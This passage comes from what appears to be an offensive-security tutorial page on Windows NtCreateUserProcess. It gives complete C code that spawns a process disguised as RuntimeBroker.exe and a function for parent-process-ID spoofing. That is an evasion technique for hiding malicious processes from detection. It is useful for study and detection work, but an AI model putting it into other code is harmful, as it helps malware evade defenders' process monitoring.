+        </div><li style="list-style-type:circle"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Flags</code> - This is set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RTL_USER_PROC_PARAMS_NORMALIZED</code> to keep parameters normalized as per Process Hacker&#x27;s <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2733" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">note</a>. With that being said, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Flags</code> can be set to any of the values below.</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001      // indicates that the parameters passed to the process are already in a normalized form#define RTL_USER_PROC_PROFILE_USER 0x00000002           // enables user-mode profiling for the process#define RTL_USER_PROC_PROFILE_KERNEL 0x00000004         // enables kernel-mode profiling for the process#define RTL_USER_PROC_PROFILE_SERVER 0x00000008         // enables server-mode profiling for the process#define RTL_USER_PROC_RESERVE_1MB 0x00000020            // reserves 1 megabyte (MB) of virtual address space for the process#define RTL_USER_PROC_RESERVE_16MB 0x00000040           // reserves 16 MB of virtual address space for the process#define RTL_USER_PROC_CASE_SENSITIVE 0x00000080         // sets the process to be case-sensitive#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100  // disables heap decommitting for the process#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000  // enables local DLL redirection for the process#define RTL_USER_PROC_APP_MANIFEST_PRESENT 0x00002000   // indicates that an application manifest is present for the process#define RTL_USER_PROC_IMAGE_KEY_MISSING 0x00004000      // indicates that the image key is missing for the process#define RTL_USER_PROC_OPTIN_PROCESS 0x00020000          // indicates that the process has opted in to some specific behavior or feature</code></pre>
+        </div><h3 id="creating-a-process-using-ntcreateuserprocess" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Creating a Process Using NtCreateUserProcess</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Now that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> has been thoroughly explained, this section will demonstrate the usage of the function to create a process via the custom function <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessMinimalPoC</code>. Note that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> only requires one attribute as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T TotalLength;
+	PS_ATTRIBUTE Attributes[1]; // 1 attribute
+
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</code></pre>
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL NtCreateUserProcessMinimalPoC(
+	IN      PWSTR   szTargetProcess,
+	IN      PWSTR   szTargetProcessParameters,
+	IN      PWSTR   szTargetProcessPath,
+	OUT     PHANDLE hProcess,
+	OUT     PHANDLE hThread
+) {
+
+	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
+	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
+	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);
+
+	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
+		return FALSE;
+
+	NTSTATUS                        STATUS                      = NULL;
+	UNICODE_STRING                  UsNtImagePath               = { 0 },
+                                    UsCommandLine               = { 0 },
+                                    UsCurrentDirectory          = { 0 };
+	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
+	// allocating a buffer to hold the value of the attribute lists
+	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+	if (!pAttributeList)
+		return FALSE;
+
+	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
+	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
+	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
+	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);
+
+	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
+	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+	// setting the length of the attribute list
+	pAttributeList-&gt;TotalLength                    = sizeof(PS_ATTRIBUTE_LIST);
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
+	pAttributeList-&gt;Attributes[0].Attribute        = PS_ATTRIBUTE_IMAGE_NAME;
+	pAttributeList-&gt;Attributes[0].Size             = UsNtImagePath.Length;
+	pAttributeList-&gt;Attributes[0].Value            = (ULONG_PTR)UsNtImagePath.Buffer;
+
+	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
+	PS_CREATE_INFO				psCreateInfo = {
+					.Size  = sizeof(PS_CREATE_INFO),
+					.State = PsCreateInitialState
+	};
+
+	// creating the process
+	// hProcess and hThread are already pointers
+	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+_EndOfFunc:
+	HeapFree(GetProcessHeap(), 0, pAttributeList);
+	if (*hProcess == NULL || *hThread == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><h3 id="custom-rtlinitunicodestring" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Custom RtlInitUnicodeString</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">_RtlInitUnicodeString</code> function initializes a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code> structure with the provided wide string. Note that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">_RtlInitUnicodeString</code> is a custom replacement function of the real one, that is <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">RtlInitUnicodeString</a>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {
+
+	if ((UsStruct-&gt;Buffer = (PWSTR)Buffer)) {
+
+		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
+		if (Length &gt; 0xfffc)
+			Length = 0xfffc;
+
+		UsStruct-&gt;Length = Length;
+		UsStruct-&gt;MaximumLength = UsStruct-&gt;Length + sizeof(WCHAR);
+	}
+
+	else UsStruct-&gt;Length = UsStruct-&gt;MaximumLength = 0;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The second if-statement in the above function is to check if the calculated length (in bytes) is greater than the maximum size allowed for a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code> structure (<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0xfffc</code>). If that&#x27;s the case, the length is capped at the maximum size. Besides that, the function initializes the inputted <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UNICODE_STRING</code>&#x27;s elements with the correct values.</p><h3 id="main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Use the main function below to call the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessMinimalPoC</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define TARGET_PROCESS          L&quot;\\??\\C:\\Windows\\System32\\RuntimeBroker.exe&quot;#define PROCESS_PARMS           L&quot;C:\\Windows\\System32\\RuntimeBroker.exe -Embedding&quot;#define PROCESS_PATH            L&quot;C:\\Windows\\System32&quot;int main() {
+
+  HANDLE	hProcess	= NULL,
+		    hThread		= NULL;
+
+  if (!NtCreateUserProcessMinimalPoC(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &amp;hProcess, &amp;hThread))
+	return -1;
+
+  printf(&quot;[+] Target Process Created With Pid : %d \n&quot;, GetProcessId(hProcess));
+  printf(&quot;[+] Process&#x27;s Main Thread Created With Tid : %d \n&quot;, GetThreadId(hThread));
+  return 0;
+}</code></pre>
+        </div><h3 id="results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Results</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-526114852-0ea90178-69cb-4383-98c2-796ffb348451.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Which looks similar to that of a legit RuntimeBroker (except for the parent Process).</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-626114907-67b9501b-6e77-42b2-98a1-f7eac8e3021c.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="ppid-spoofing-using-ntcreateuserprocess" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>PPID Spoofing Using NtCreateUserProcess</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next usage of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> will be for performing PPID spoofing. Note that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> needs to be modified to allow an additional attribute as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T TotalLength;
+	PS_ATTRIBUTE Attributes[2]; // Increment to 2 for an additional attribute
+
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForPPidSpoofing</code> is a custom function that performs PPID spoofing. The function is similar to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessMinimalPoC</code>, with the main difference being that the additional attribute uses the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_PARENT_PROCESS</code> flag to specify the spoofed parent process.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL NtCreateUserProcessForPPidSpoofing(
+	IN      PWSTR   szTargetProcess,
+	IN      PWSTR   szTargetProcessParameters,
+	IN      PWSTR   szTargetProcessPath,
+	IN      HANDLE  hParentProcess,
+	OUT     PHANDLE hProcess,
+	OUT     PHANDLE hThread
+) {
+
+	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
+	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
+	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);
+
+	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
+		return FALSE;
+
+	NTSTATUS                        STATUS                      = NULL;
+	UNICODE_STRING                  UsNtImagePath               = { 0 },
+                                    UsCommandLine               = { 0 },
+                                    UsCurrentDirectory          = { 0 };
+	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
+	// allocating a buffer to hold the value of the attribute lists
+	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+	if (!pAttributeList)
+		return FALSE;
+
+	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
+	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
+	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
+	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);
+
+	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
+	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+	// setting the length of the attribute list
+	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
+	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
+	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
+	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_PARENT_PROCESS&#x27; that specifies the process&#x27;s parent
+	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
+	pAttributeList-&gt;Attributes[1].Size              = sizeof(HANDLE);
+	pAttributeList-&gt;Attributes[1].Value             = hParentProcess;
+
+	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
+	PS_CREATE_INFO				psCreateInfo = {
+					.Size	= sizeof(PS_CREATE_INFO),
+					.State	= PsCreateInitialState
+	};
+
+	// creating the process
+	// hProcess and hThread are already pointers
+	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+
+_EndOfFunc:
+	HeapFree(GetProcessHeap(), 0, pAttributeList);
+	if (*hProcess == NULL || *hThread == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><h3 id="main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The main function below invokes <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForPPidSpoofing</code> to perform PPID spoofing.</p>
